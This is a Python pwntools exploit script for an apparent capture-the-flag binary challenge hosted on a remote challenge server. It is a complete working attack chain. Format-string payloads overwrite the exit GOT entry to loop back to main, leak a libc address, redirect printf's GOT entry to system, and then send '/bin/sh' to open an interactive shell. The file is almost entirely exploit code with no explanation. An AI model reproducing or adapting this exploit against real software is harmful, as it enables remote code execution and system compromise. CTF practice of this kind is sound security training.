from pwn import *

context(os='linux', arch='amd64')

PRINTF_GOT = 0x404010
EXIT_GOT = 0x404000

WIN = 0x401196

MAIN = 0x4011db



elf = context.binary = ELF('./chall')
libc = elf.libc
#r = process()
r = remote('0.cloud.chals.io', 30732)

#pid = gdb.attach(r, gdbscript='''
#                 break *main+169
#                 break *main+159
#                 break *win+68
#                 ''')

payload = fmtstr_payload(8, {EXIT_GOT: MAIN}, numbwritten=0, write_size='byte')
#payload = b"%1$pAAAAA"
#payload += b'%10$lx'
#payload += p64(EXIT_GOT)
print(payload)


r.recvuntil(b'This challenge seems easy enough')
r.sendline(payload)

payload2 = b"%1$p"
r.recvuntil(b'This challenge seems easy enough')
r.sendline(payload2)
r.recvline()

libc_addr_str = r.recvline().rstrip()
libc_addr = int(libc_addr_str, 16) - 0x1d3b23
print(libc_addr_str)

libc.address = libc_addr
print(hex(libc.address))
print(hex(libc.symbols['system']))


payload3 = fmtstr_payload(8, {PRINTF_GOT: libc.symbols['system']}, numbwritten=0, write_size='short')
print(payload3)
print(len(payload3))
r.sendline(payload3)

r.recvuntil(b'This challenge seems easy enough\n')

r.sendline(b"/bin/sh")
#r.sendline(b"/bin/sh")
r.interactive()
